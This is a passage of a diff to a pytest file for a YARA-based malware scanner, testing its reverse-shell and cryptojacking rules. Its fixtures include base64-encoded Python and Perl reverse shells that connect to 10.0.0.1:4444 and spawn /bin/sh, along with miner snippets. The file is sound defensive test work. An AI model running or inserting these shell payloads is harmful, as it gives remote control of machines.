+            "Zm9yIGZkIGluICgwLDEsMildOyBzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSkK"
+        ).decode(),
+        "dup2_sys_stdin_fileno": base64.b64decode(
+            "cyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsg"
+            "cy5jb25uZWN0KCgiMTAuMC4wLjEiLDQ0NDQpKTsgb3MuZHVwMihzLmZpbGVubygpLHN5cy5z"
+            "dGRpbi5maWxlbm8oKSk7IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQo="
+        ).decode(),
+        "stdin_socket_object": base64.b64decode(
+            "cyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsg"
+            "cy5jb25uZWN0KCgiMTAuMC4wLjEiLDQ0NDQpKTsgc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9z"
+            "aCIsIi1pIl0sc3RkaW49cyxzdGRvdXQ9cyxzdGRlcnI9cykK"
+        ).decode(),
+        "subprocess_alias": base64.b64decode(
+            "aW1wb3J0IHN1YnByb2Nlc3MgYXMgc3A7IHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9J"
+            "TkVULHNvY2tldC5TT0NLX1NUUkVBTSk7IHMuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSk7"
+            "IG9zLmR1cDIocy5maWxlbm8oKSwwKTsgc3AuY2FsbChbIi9iaW4vc2giLCItaSJdKQo="
+        ).decode(),
+        "pty_spawn_bash": base64.b64decode(
+            "cyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsg"
+            "cy5jb25uZWN0KCgiMTAuMC4wLjEiLDQ0NDQpKTsgcHR5LnNwYXduKCIvdXNyL2Jpbi9iYXNo"
+            "IikK"
+        ).decode(),
+    }
+
+
+def _single_line_perl_socket_shell() -> str:
+    """A single-line Perl socket reverse shell ending in ``system("/bin/sh -i")``
+    that ``main``'s single-line ``$perl_socket`` detects. Stored base64-encoded,
+    like the other signature-triggering fixtures, so on-access scanners do not
+    quarantine this test file."""
+    return base64.b64decode(
+        "dXNlIFNvY2tldDsgc29ja2V0KFNPQ0ssUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5"
+        "bmFtZSgidGNwIikpOyBjb25uZWN0KFNPQ0ssc29ja2FkZHJfaW4oJHBvcnQsaW5ldF9hdG9u"
+        "KCRpcCkpKTsgc3lzdGVtKCIvYmluL3NoIC1pIik7Cg=="
+    ).decode()
+
+
 def _has_rule(findings: list, rule_name: str) -> bool:
-    """Return True when a finding message references a specific YARA rule."""
+    """Return True when a finding message references a specific YARA rule.
+
+    NOTE: substring match — ``"reverse_shell"`` also matches
+    ``reverse_shell_multiline``. To tell the two reverse-shell rules apart use
+    `_is_rule` / `_findings_from_rule` instead.
+    """
     return any(rule_name in f.message for f in findings)
+
+
+def _is_rule(finding, rule_name: str) -> bool:
+    """True when ``finding`` comes from exactly ``rule_name``.
+
+    `_build_message` renders the rule name quoted (``YARA rule '<name>'``), so
+    matching that token distinguishes the certain ``reverse_shell`` rule from
+    the ``reverse_shell_multiline`` heuristic whose name merely has it as a
+    prefix.
+    """
+    return f"YARA rule '{rule_name}'" in finding.message
+
+
+def _findings_from_rule(findings: list, rule_name: str) -> list:
+    """All findings produced by exactly ``rule_name`` (see `_is_rule`)."""
+    return [f for f in findings if _is_rule(f, rule_name)]
+
+
+def _has_critical_reverse_shell(findings: list) -> bool:
+    """True when the certain ``reverse_shell`` rule produced a CRITICAL finding.
+
+    Matches the exact rule name, so the reduced-severity
+    ``reverse_shell_multiline`` heuristic can never satisfy it — even if that
+    rule's meta were (incorrectly) raised to CRITICAL.
+    """
+    return any(_is_rule(f, "reverse_shell") and f.severity == "CRITICAL" for f in findings)
+
+
+def _assert_only_multiline_heuristic(findings: list) -> None:
+    """Assert the multiline heuristic is the only reverse-shell verdict.
+
+    Exactly one ``reverse_shell_multiline`` YR1 finding at ``HIGH`` /
+    confidence ``0.6``, and no certain ``reverse_shell`` finding. This pins the
+    heuristic's promised reduced severity: if its meta were silently raised to
+    CRITICAL/0.85 (as in the competing PRs), the severity/confidence checks
+    here would fail.
+    """
+    heuristic = _findings_from_rule(findings, "reverse_shell_multiline")
+    assert len(heuristic) == 1, (
+        "expected exactly one reverse_shell_multiline finding, got "
+        f"{[f.message for f in heuristic]}"
+    )
+    finding = heuristic[0]
+    assert finding.rule_id == "YR1"
+    assert finding.severity == "HIGH"
+    assert finding.confidence == 0.6
+    assert not _findings_from_rule(findings, "reverse_shell"), (
+        "unbound multiline lookalike must not fire the certain reverse_shell rule"
+    )
 
 
 # ── Core pipeline ────────────────────────────────────────────────────
 
 
 class TestCorePipeline:
+    def test_long_match_preview_uses_complete_raw_match_identity(self, tmp_path):
+        rule = tmp_path / "long_tail.yar"
+        rule.write_text(
+            """rule long_tail {
+    meta:
+        description = "Long match"
+        category = "malware"
+        severity = "HIGH"
+        confidence = "0.9"
+    strings:
+        $a = /A{700}[XY]/
+    condition:
+        any of them
+}
+""",
+            encoding="utf-8",
+        )
+        shared = "A" * 700
+        first = _run(shared + "X", "first.txt", str(tmp_path))[0]
+        second = _run(shared + "Y", "second.txt", str(tmp_path))[0]
+        exact = _run(shared + "X", "exact.txt", str(tmp_path))[0]
+
+        assert first.matched_text == second.matched_text
+        assert len(first.matched_text or "") == 200
+        assert first.fingerprint() != second.fingerprint()
+        assert len(deduplicate([first, second])) == 2
+
+        compacted = deduplicate([first, exact])
+        assert len(compacted) == 1
+        assert {item["file"] for item in compacted[0].occurrences} == {
+            "first.txt",
+            "exact.txt",
+        }
+        assert shared + "X" not in json.dumps(first.to_dict(), sort_keys=True)
+
+    def test_distinct_rule_names_matching_same_bytes_keep_distinct_identities(
+        self, monkeypatch
+    ) -> None:
+        rules = static_yara.yara.compile(
+            source="""
+rule first_detector {
+    meta:
+        category = "malware"
+        severity = "CRITICAL"
+        confidence = "0.9"
+    strings:
+        $marker = "SHARED_MARKER"
+    condition:
+        $marker
+}
+
+rule second_detector {
+    meta:
+        category = "malware"
+        severity = "CRITICAL"
+        confidence = "0.9"
+    strings:
+        $marker = "SHARED_MARKER"
+    condition:
+        $marker
+}
+"""
+        )
+        monkeypatch.setattr(static_yara, "_load_rules", lambda _extra_dir: rules)
+
+        findings = static_yara.node(
+            {
+                "components": ["skill.txt"],
+                "file_cache": {"skill.txt": "SHARED_MARKER"},
+            }
+        )["findings"]
+
+        assert len(findings) == 2
+        assert {finding.rule_id for finding in findings} == {"YR1"}
+        assert len({finding.match_fingerprint for finding in findings}) == 2
+        compacted = deduplicate(findings)
+        assert len(compacted) == 2
+        assert {finding.message for finding in compacted} == {
+            "YARA rule 'first_detector'",
+            "YARA rule 'second_detector'",
+        }
+        assert _compute_risk_score(compacted, False) == (67, "HIGH", "DO_NOT_INSTALL")
+
+    def test_same_rule_name_in_distinct_namespaces_keeps_distinct_identities(
+        self, monkeypatch
+    ) -> None:
+        source = """
+rule shared_detector {
+    meta:
+        category = "malware"
+    strings:
+        $marker = "SHARED_MARKER"
+    condition:
+        $marker
+}
+"""
+        rules = static_yara.yara.compile(sources={"first_feed": source, "second_feed": source})
+        monkeypatch.setattr(static_yara, "_load_rules", lambda _extra_dir: rules)
+
+        findings = static_yara.node(
+            {
+                "components": ["skill.txt"],
+                "file_cache": {"skill.txt": "SHARED_MARKER"},
+            }
+        )["findings"]
+
+        assert len(findings) == 2
+        assert len({finding.match_fingerprint for finding in findings}) == 2
+        assert len(deduplicate(findings)) == 2
+
+    def test_full_match_fingerprinting_is_byte_bounded(self, monkeypatch):
+        rules = static_yara.yara.compile(
+            source="rule long_tail { strings: $a = /A{700}X/ condition: $a }"
+        )
+        monkeypatch.setattr(
+            static_yara,
+            "MAX_YARA_MATCH_FINGERPRINT_BYTES_PER_FILE",
+            128,
+            raising=False,
+        )
+
+        matched = static_yara._match_file(
+            rules,
+            b"A" * 700 + b"X",
+            "large-match.txt",
+        )
+
+        assert len(matched.findings) == 1
+        assert matched.findings[0].match_fingerprint is not None
+        assert matched.reason == LedgerReason.SIZE_LIMIT
+        assert matched.metrics == {
+            "observed_bytes": 701,
+            "limit_bytes": 128,
+        }
+
+    def test_fingerprint_bound_marks_node_analysis_partial(self, monkeypatch):
+        rules = static_yara.yara.compile(
+            source="rule long_tail { strings: $a = /A{700}X/ condition: $a }"
+        )
+        monkeypatch.setattr(static_yara, "_load_rules", lambda _extra_dir: rules)
+        monkeypatch.setattr(
+            static_yara,
+            "MAX_YARA_MATCH_FINGERPRINT_BYTES_PER_FILE",
+            128,
+            raising=False,
+        )
+
+        result = static_yara.node(
+            {
+                "components": ["large-match.txt"],
+                "file_cache": {"large-match.txt": "A" * 700 + "X"},
+            }
+        )
+
+        assert len(result["findings"]) == 1
+        assert result["inspection_ledger"][0]["outcome"] == "partial"
+        assert result["inspection_ledger"][0]["reason_code"] == "size_limit"
+        assert result["inspection_ledger"][0]["emitted_finding_ids"] == [
+            result["findings"][0].finding_id
+        ]
+        assert result["analyzer_status_events"][0]["status"] == "degraded"
+
+    def test_fingerprint_budget_retains_current_match_with_deterministic_fallback(
+        self, monkeypatch
+    ) -> None:
+        """A fingerprint-limit signal cannot discard the matching YARA rule."""
+        rules = static_yara.yara.compile(
+            source='rule budgeted { strings: $a = "MARKER" condition: $a }'
+        )
+
+        def raise_fingerprint_limit(*_args, **_kwargs):
+            raise static_yara._YaraFingerprintLimitError(129, 128)
+
+        monkeypatch.setattr(static_yara, "_match_instances_fingerprint", raise_fingerprint_limit)
+        monkeypatch.setattr(static_yara, "_load_rules", lambda _extra_dir: rules)
+
+        first = static_yara.node(
+            {"components": ["skill.txt"], "file_cache": {"skill.txt": "MARKER"}}
+        )
+        second = static_yara.node(
+            {"components": ["skill.txt"], "file_cache": {"skill.txt": "MARKER"}}
+        )
+
+        assert len(first["findings"]) == 1
+        assert first["findings"][0].match_fingerprint is not None
+        assert first["findings"][0].match_fingerprint == second["findings"][0].match_fingerprint
+        assert first["findings"][0].match_fingerprint.startswith("fallback-sha256:")
+        event = first["inspection_ledger"][0]
+        assert event["outcome"] == "partial"
+        assert event["reason_code"] == "size_limit"
+        assert event["observed_bytes"] == 129
+        assert event["limit_bytes"] == 128
+        assert event["emitted_finding_ids"] == [first["findings"][0].finding_id]
+
+    def test_fallback_identity_keeps_same_rule_matches_in_different_files_distinct(
+        self, monkeypatch
+    ) -> None:
+        """Fallback fingerprints remain occurrence-safe across file boundaries."""
+        rules = static_yara.yara.compile(
+            source='rule budgeted { strings: $a = "MARKER" condition: $a }'
+        )
+
+        def raise_fingerprint_limit(*_args, **_kwargs):
+            raise static_yara._YaraFingerprintLimitError(129, 128)
+
+        monkeypatch.setattr(static_yara, "_match_instances_fingerprint", raise_fingerprint_limit)
+        monkeypatch.setattr(static_yara, "_load_rules", lambda _extra_dir: rules)
+
+        result = static_yara.node(
+            {
+                "components": ["first.txt", "second.txt"],
+                "file_cache": {
+                    "first.txt": "MARKER first raw payload",
+                    "second.txt": "MARKER second raw payload",
+                },
+            }
+        )
+
+        assert len(result["findings"]) == 2
+        assert len({finding.match_fingerprint for finding in result["findings"]}) == 2
+        assert len(deduplicate(result["findings"])) == 2
+
     def test_single_match_produces_finding(self, tmp_path):
         _write_rule(
             tmp_path,
@@ -367,6 +1157,400 @@ class TestBuiltInMalwarePackaging:
         assert _has_rule(findings, "reverse_shell")
         assert any(f.rule_id == "YR1" for f in findings)
 
+    def test_reverse_shell_rule_matches_multiline_python_socket(self):
+        """A real multiline Python reverse shell must be flagged.
+
+        A Python reverse shell bundled as a file writes ``socket.socket(...)``
+        and ``.connect(...)`` as separate statements, not on one line — see
+        `_multiline_python_socket_reverse_shell_fixture`. ``main``'s single-line
+        ``$python_socket`` string (left byte-identical by this PR) cannot span
+        those newlines, so this shape is caught instead by the separate
+        ``reverse_shell_multiline`` heuristic and reported at HIGH /
+        confidence 0.6 — never the certain CRITICAL ``reverse_shell`` rule.
+        """
+        findings = _run_builtin(
+            _multiline_python_socket_reverse_shell_fixture(),
+            "scripts/sync.py",
+        )
+        _assert_only_multiline_heuristic(findings)
+
+    def test_reverse_shell_rule_does_not_match_benign_python_socket_client(self):
+        """An ordinary multiline TCP client must fire neither reverse-shell rule.
+
+        A plain client that connects and exchanges data — see
+        `_benign_python_socket_client_fixture` — has no descriptor redirection
+        onto the socket and no shell-execution marker after ``connect()``, so
+        neither the certain ``reverse_shell`` rule nor the
+        ``reverse_shell_multiline`` heuristic may report it.
+        """
+        findings = _run_builtin(
+            _benign_python_socket_client_fixture(),
+            "scripts/client.py",
+        )
+        assert not _has_rule(findings, "reverse_shell")
+
+    def test_reverse_shell_rule_does_not_match_python_client_running_unrelated_helper_subprocess(
+        self,
+    ):
+        """A bare ``subprocess``/``os.system``/``pty.spawn``/``execve`` token
+        after ``connect()`` is not sufficient. An ordinary client that merely
+        shells out to an unrelated helper (no descriptor redirection onto the
+        socket, no shell payload) must fire neither the certain ``reverse_shell``
+        rule nor the ``reverse_shell_multiline`` heuristic. See
+        `_python_helper_subprocess_fixture`: this must NOT match.
+        """
+        findings = _run_builtin(
+            _python_helper_subprocess_fixture(),
+            "scripts/report.py",
+        )
+        assert not _has_rule(findings, "reverse_shell")
+
+    def test_reverse_shell_rule_does_not_match_python_client_that_reopens_stdin_without_shell(self):
+        """``os.dup2`` redirection alone, without a following shell execution
+        marker, must not fire ``reverse_shell``/YR1 — a process may
+        legitimately read its own stdin from a socket without ever spawning a
+        shell. See `_python_stdin_reopen_no_shell_fixture`: this must NOT
+        match.
+        """
+        findings = _run_builtin(
+            _python_stdin_reopen_no_shell_fixture(),
+            "scripts/stdin_reader.py",
+        )
+        assert not _has_rule(findings, "reverse_shell")
+
+    def test_reverse_shell_rule_matches_multiline_perl_socket(self):
+        """A real multiline Perl reverse shell must be flagged.
+
+        See `_multiline_perl_socket_reverse_shell_fixture`: connect, then
+        redirect STDIN/STDOUT/STDERR onto the socket and exec a shell. Like the
+        Python case, this multiline shape is reported by the
+        ``reverse_shell_multiline`` heuristic (HIGH / confidence 0.6), not by
+        ``main``'s unchanged single-line ``$perl_socket`` string.
+        """
+        findings = _run_builtin(
+            _multiline_perl_socket_reverse_shell_fixture(),
+            "scripts/backdoor.pl",
+        )
+        _assert_only_multiline_heuristic(findings)
+
+    def test_reverse_shell_rule_does_not_match_benign_perl_socket_client(self):
+        """An ordinary Perl TCP client must fire neither reverse-shell rule.
+
+        ``main``'s single-line ``$perl_socket`` string is unchanged by this PR,
+        and the ``reverse_shell_multiline`` heuristic requires socket-backed
+        STDIN/STDOUT/STDERR redirection plus a shell exec. A client that merely
+        uses the ``Socket`` module and exchanges a line — see
+        `_benign_perl_socket_client_fixture` — satisfies neither.
+        """
+        findings = _run_builtin(
+            _benign_perl_socket_client_fixture(),
+            "scripts/client.pl",
+        )
+        assert not _has_rule(findings, "reverse_shell")
+
+    def test_reverse_shell_rule_does_not_match_perl_client_running_unrelated_helper_exec(self):
+        """A bare ``exec(`` after ``connect()`` is not sufficient. An ordinary
+        client that ``exec``s an unrelated non-shell helper (no
+        STDIN/STDOUT/STDERR redirection onto the socket) must fire neither the
+        certain ``reverse_shell`` rule nor the ``reverse_shell_multiline``
+        heuristic. See `_perl_helper_exec_nonshell_fixture`: this must NOT match.
+        """
+        findings = _run_builtin(
+            _perl_helper_exec_nonshell_fixture(),
+            "scripts/report.pl",
+        )
+        assert not _has_rule(findings, "reverse_shell")
+
+    def test_reverse_shell_rule_does_not_match_perl_client_that_reopens_stdin_without_exec(self):
+        """``open(STDIN, ...)`` redirection alone, without a following
+        ``exec`` of a shell, must not fire ``reverse_shell``/YR1. See
+        `_perl_stdin_reopen_no_exec_fixture`: this must NOT match.
+        """
+        findings = _run_builtin(
+            _perl_stdin_reopen_no_exec_fixture(),
+            "scripts/stdin_reader.pl",
+        )
+        assert not _has_rule(findings, "reverse_shell")
+
+    def test_reverse_shell_rule_matches_dup2_execl_python_shell(self):
+        """``os.execl`` must be recognized alongside ``os.execve`` as a
+        dup2-preceded shell-exec marker. See
+        `_python_dup2_execl_reverse_shell_fixture`.
+        """
+        findings = _run_builtin(
+            _python_dup2_execl_reverse_shell_fixture(),
+            "scripts/backdoor.py",
+        )
+        _assert_only_multiline_heuristic(findings)
+
+    def test_reverse_shell_rule_matches_dup2_pty_spawn_list_python_shell(self):
+        """``pty.spawn([...])`` with a list argument must match, the same as
+        ``subprocess.call``/``Popen``/``run``. See
+        `_python_dup2_pty_spawn_reverse_shell_fixture`.
+        """
+        findings = _run_builtin(
+            _python_dup2_pty_spawn_reverse_shell_fixture(),
+            "scripts/backdoor.py",
+        )
+        _assert_only_multiline_heuristic(findings)
+
+    def test_reverse_shell_rule_matches_fileno_kwarg_python_shell(self):
+        """``stdin=``/``stdout=``/``stderr=`` keyword redirection to
+        ``subprocess.call`` is equivalent evidence to ``os.dup2`` and must
+        also match. See `_python_fileno_kwarg_reverse_shell_fixture`.
+        """
+        findings = _run_builtin(
+            _python_fileno_kwarg_reverse_shell_fixture(),
+            "scripts/backdoor.py",
+        )
+        _assert_only_multiline_heuristic(findings)
+
+    def test_reverse_shell_rule_does_not_match_python_dup2_nonshell_helper_with_sh_prefix(self):
+        """A non-shell helper whose name merely starts with ``sh`` (e.g.
+        ``sha256sum``) must NOT satisfy the shell-execution marker. See
+        `_python_dup2_nonshell_helper_fixture`: this must NOT match.
+        """
+        findings = _run_builtin(
+            _python_dup2_nonshell_helper_fixture(),
+            "scripts/report.py",
+        )
+        assert not _has_rule(findings, "reverse_shell")
+
+    def test_reverse_shell_rule_does_not_match_python_dup2_unrelated_local_logging(self):
+        """``os.dup2`` onto an unrelated log file's descriptor (stdout, never
+        stdin) after the socket has already closed must NOT satisfy the
+        descriptor-redirection marker — the socket is never wired to the
+        shell's stdin. See `_python_dup2_unrelated_local_logging_fixture`:
+        this must NOT match.
+        """
+        findings = _run_builtin(
+            _python_dup2_unrelated_local_logging_fixture(),
+            "scripts/housekeeping.py",
+        )
+        assert not _has_rule(findings, "reverse_shell")
+
+    def test_reverse_shell_rule_matches_multiline_perl_socket_without_parens(self):
+        """Perl's parenthesis-free ``open``/``exec`` forms are valid syntax
+        and must match the same as the parenthesized forms. See
+        `_multiline_perl_socket_reverse_shell_no_parens_fixture`.
+        """
+        findings = _run_builtin(
+            _multiline_perl_socket_reverse_shell_no_parens_fixture(),
+            "scripts/backdoor.pl",
+        )
+        _assert_only_multiline_heuristic(findings)
+
+    def test_reverse_shell_rule_does_not_match_perl_helper_exec_with_sh_prefix(self):
+        """A non-shell helper whose name merely starts with ``sh`` (e.g.
+        ``sha256sum``) must NOT satisfy the ``reverse_shell_multiline``
+        heuristic's shell-execution marker. See `_perl_helper_exec_nonshell_prefix_fixture`: this must
+        NOT match.
+        """
+        findings = _run_builtin(
+            _perl_helper_exec_nonshell_prefix_fixture(),
+            "scripts/report.pl",
+        )
+        assert not _has_rule(findings, "reverse_shell")
+
+    def test_reverse_shell_rule_does_not_critical_match_python_dup2_local_open(self):
+        """``dup2`` redirection sourced from a local ``open()`` call, not the
+        (already closed) socket, must NOT yield a CRITICAL ``reverse_shell``.
+
+        YARA cannot bind the redirected descriptor to the connected socket, so
+        this is reported only by the reduced-severity ``reverse_shell_multiline``
+        heuristic (never cancelled outright — cancellation would also drop real
+        shells). See `_python_dup2_local_open_fixture`.
+        """
+        findings = _run_builtin(
+            _python_dup2_local_open_fixture(),
+            "scripts/backdoor.py",
+        )
+        _assert_only_multiline_heuristic(findings)
+
+    def test_reverse_shell_rule_does_not_critical_match_python_stdin_kwarg_local_open(self):
+        """The ``stdin=`` keyword-argument form of redirection sourced from a
+        local ``open()`` call must NOT yield a CRITICAL ``reverse_shell`` either.
+
+        Like the ``dup2`` form, the descriptor cannot be bound to the socket, so
+        it is reported only by the reduced-severity heuristic. See
+        `_python_stdin_kwarg_local_open_fixture`.
+        """
+        findings = _run_builtin(
+            _python_stdin_kwarg_local_open_fixture(),
+            "scripts/backdoor.py",
+        )
+        _assert_only_multiline_heuristic(findings)
+
+    def test_reverse_shell_rule_does_not_match_python_dup2_sh_helper_hyphen(self):
+        """A non-shell helper whose name has ``sh`` as a prefix before a
+        hyphen (``sh-helper``) must NOT satisfy the shell-execution marker —
+        ``-`` is a non-word character, so a bare ``\\b`` boundary after the
+        shell name is not a complete token boundary. See
+        `_python_dup2_sh_helper_hyphen_fixture`: this must NOT match.
+        """
+        findings = _run_builtin(
+            _python_dup2_sh_helper_hyphen_fixture(),
+            "scripts/report.py",
+        )
+        assert not _has_rule(findings, "reverse_shell")
+
+    def test_reverse_shell_rule_does_not_match_perl_local_input_no_amp(self):
+        """Perl's ``STDIN`` redirected from a local file path (no ``&``
+        fd-duplication) must NOT satisfy either reverse-shell rule. See
+        `_perl_local_input_no_amp_fixture`: this must NOT match.
+        """
+        findings = _run_builtin(
+            _perl_local_input_no_amp_fixture(),
+            "scripts/backdoor.pl",
+        )
+        assert not _has_rule(findings, "reverse_shell")
+
+    def test_reverse_shell_rule_does_not_match_perl_local_output_no_amp(self):
+        """Perl's ``STDOUT`` redirected to a local file path (no ``&``
+        fd-duplication) must NOT satisfy either reverse-shell rule. See
+        `_perl_local_output_no_amp_fixture`: this must NOT match.
+        """
+        findings = _run_builtin(
+            _perl_local_output_no_amp_fixture(),
+            "scripts/backdoor.pl",
+        )
+        assert not _has_rule(findings, "reverse_shell")
+
+    def test_reverse_shell_rule_does_not_match_perl_sh_helper_hyphen(self):
+        """A non-shell helper whose name has ``sh`` as a prefix before a
+        hyphen (``sh-helper``) must NOT satisfy the ``reverse_shell_multiline``
+        heuristic's shell-execution marker. See `_perl_sh_helper_hyphen_fixture`: this
+        must NOT match.
+        """
+        findings = _run_builtin(
+            _perl_sh_helper_hyphen_fixture(),
+            "scripts/report.pl",
+        )
+        assert not _has_rule(findings, "reverse_shell")
+
+    # ── Genuine shells must not be cancelled by an unrelated ``open`` ──────
+    # A ``= open(`` anywhere in the file must never suppress real
+    # socket-redirection-plus-shell evidence.
+
+    def test_reverse_shell_detects_shell_that_reads_file_before_dup2(self):
+        """A ``key = open(...).read()`` between ``connect`` and ``dup2`` must
+        not cancel detection. See
+        `_python_read_file_between_connect_and_shell_fixture`."""
+        findings = _run_builtin(
+            _python_read_file_between_connect_and_shell_fixture(),
+            "scripts/backdoor.py",
+        )
+        _assert_only_multiline_heuristic(findings)
+
+    def test_reverse_shell_detects_clean_shell_after_probe_socket_and_open(self):
+        """A probe socket plus ``host = open(...).read()`` must not suppress a
+        later, independent genuine shell. See
+        `_python_probe_socket_then_clean_reverse_shell_fixture`."""
+        findings = _run_builtin(
+            _python_probe_socket_then_clean_reverse_shell_fixture(),
+            "scripts/backdoor.py",
+        )
+        _assert_only_multiline_heuristic(findings)
+
+    def test_reverse_shell_detects_shell_with_trailing_cleanup_open(self):
+        """A trailing cleanup ``marker = open(...)`` must not cancel the earlier
+        socket-plus-shell match. See
+        `_python_reverse_shell_with_cleanup_open_fixture`."""
+        findings = _run_builtin(
+            _python_reverse_shell_with_cleanup_open_fixture(),
+            "scripts/backdoor.py",
+        )
+        _assert_only_multiline_heuristic(findings)
+
+    def test_reverse_shell_detects_dup2_loop_redirection(self):
+        """A ``for fd in (0, 1, 2): os.dup2(s.fileno(), fd)`` loop form must be
+        recognized by the multiline evidence. See
+        `_python_dup2_loop_reverse_shell_fixture`."""
+        findings = _run_builtin(
+            _python_dup2_loop_reverse_shell_fixture(),
+            "scripts/backdoor.py",
+        )
+        _assert_only_multiline_heuristic(findings)
+
+    # ── Unbound local redirection: reduced severity, never CRITICAL ───────
+
+    def test_with_open_local_commands_is_not_critical(self):
+        """The idiomatic ``with open(...) as commands:`` + ``dup2(..., 0)`` +
+        shell form, from a local file after the socket is closed, must not be a
+        CRITICAL ``reverse_shell``. See `_python_with_open_local_commands_fixture`."""
+        findings = _run_builtin(
+            _python_with_open_local_commands_fixture(),
+            "scripts/backdoor.py",
+        )
+        _assert_only_multiline_heuristic(findings)
+
+    def test_perl_local_cmds_dup_is_not_critical(self):
+        """Perl ``open(STDIN, "<&CMDS")`` dup from a local file handle, after a
+        closed socket, must not be a CRITICAL ``reverse_shell``. See
+        `_perl_local_cmds_dup_fixture`."""
+        findings = _run_builtin(
+            _perl_local_cmds_dup_fixture(),
+            "scripts/backdoor.pl",
+        )
+        _assert_only_multiline_heuristic(findings)
+
+    def test_perl_three_arg_dup_is_not_critical(self):
+        """Perl three-argument ``open(STDIN, "<&", $fh)`` dup from an unbound
+        handle must not be a CRITICAL ``reverse_shell``. See
+        `_perl_three_arg_dup_fixture`."""
+        findings = _run_builtin(
+            _perl_three_arg_dup_fixture(),
+            "scripts/backdoor.pl",
+        )
+        _assert_only_multiline_heuristic(findings)
+
+    # ── Location integrity (removed helper string no longer skews offsets) ──
+
+    def test_reverse_shell_location_not_pulled_to_unrelated_open_line(self):
+        """A bash TCP reverse-shell payload must be located at the shell line,
+        not at an earlier unrelated ``settings = open(...)`` line. See
+        `_bash_reverse_shell_after_open_line_fixture`."""
+        findings = _run_builtin(
+            _bash_reverse_shell_after_open_line_fixture(),
+            "scripts/backdoor.py",
+        )
+        revshell = [f for f in findings if "reverse_shell" in f.message]
+        assert revshell
+        # The payload is on line 6; the unrelated ``open`` is on line 2.
+        assert all(f.start_line >= 6 for f in revshell)
+        assert all("open(" not in (f.matched_text or "") for f in revshell)
+
+    # ── Single-line shells preserved at CRITICAL (no main regressions) ────
+
+    @pytest.mark.parametrize(
+        "name",
+        [
+            "dup2_list_comprehension",
+            "dup2_sys_stdin_fileno",
+            "stdin_socket_object",
+            "subprocess_alias",
+            "pty_spawn_bash",
+        ],
+    )
+    def test_single_line_python_socket_shells_remain_critical(self, name):
+        """Single-line Python socket shells that ``main`` detects must stay
+        CRITICAL ``reverse_shell``. See `_single_line_python_socket_shells`."""
+        findings = _run_builtin(
+            _single_line_python_socket_shells()[name],
+            "scripts/backdoor.py",
+        )
+        assert _has_critical_reverse_shell(findings)
+
+    def test_single_line_perl_socket_shell_remains_critical(self):
+        """A single-line Perl socket shell ending in ``system("/bin/sh -i")``
+        that ``main`` detects must stay CRITICAL. See
+        `_single_line_perl_socket_shell`."""
+        findings = _run_builtin(
+            _single_line_perl_socket_shell(),
+            "scripts/backdoor.pl",
+        )
+        assert _has_critical_reverse_shell(findings)
+
     def test_extra_rules_still_match_with_builtin_malware_representation(self, tmp_path):
         _write_rule(
             tmp_path,
@@ -382,6 +1566,89 @@ class TestBuiltInMalwarePackaging:
         )
         assert _has_rule(findings, "extra_marker")
         assert _has_rule(findings, "reverse_shell")
+
+
+# ── Built-in cryptominer rules ───────────────────────────────────────
+
+
+class TestBuiltInCryptominerRules:
+    """Regression coverage for crypto_coinjacking's $wasm_miner string.
+
+    Unbounded ``(mine|hash|crypto)`` matched inside unrelated identifiers
+    (``deteRMINE``) and against common, benign Web APIs/module names
+    (``crypto.getRandomValues``, ``hashmap``) that routinely appear near any
+    ``WebAssembly.instantiate`` call, firing a CRITICAL cryptojacking finding
+    on ordinary code.
+    """
+
+    def test_wasm_instantiate_with_unrelated_hash_call_is_not_coinjacking(self):
+        content = "WebAssembly.instantiate(bytes).then(r=>{ hashmap.set(r,1) })\n"
+        findings = _run_builtin(content, "loader.js")
+        assert not _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_web_crypto_api_is_not_coinjacking(self):
+        content = "WebAssembly.instantiate(bytes).then(r=>{ crypto.getRandomValues(buf) })\n"
+        findings = _run_builtin(content, "loader.js")
+        assert not _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_mid_word_mine_is_not_coinjacking(self):
+        content = "WebAssembly.instantiate(bytes).then(r=>{ return determine(r) })\n"
+        findings = _run_builtin(content, "loader.js")
+        assert not _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_text_mining_prose_is_not_coinjacking(self):
+        """`mining` as English prose must not fire; only a mining call does."""
+        content = (
+            "WebAssembly.instantiate(bytes).then(m=>runAnalytics(m)); // helpers for text mining\n"
+        )
+        findings = _run_builtin(content, "loader.js")
+        assert not _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_start_mining_call_is_coinjacking(self):
+        """`startMining(` is a mining call even though `Mining` is mid-identifier."""
+        content = "WebAssembly.instantiate(w).then(m=>{ m.exports.startMining(pool) })\n"
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_capitalised_miner_is_coinjacking(self):
+        """Case must not matter: `new Miner(` is the common CoinHive-era shape."""
+        content = "WebAssembly.instantiate(w).then(m=>{ var x = new Miner(siteKey) })\n"
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_literal_miner_call_is_coinjacking(self):
+        content = "WebAssembly.instantiate(minerWasm).then(function(m){ m.exports.mine(); })\n"
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_cryptonight_glue_is_coinjacking(self):
+        content = (
+            "WebAssembly.instantiate(wasmBinary,info);"
+            "var _cryptonight_hash=Module._cryptonight_hash=function(){};\n"
+        )
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_hash_cn_cwrap_is_coinjacking(self):
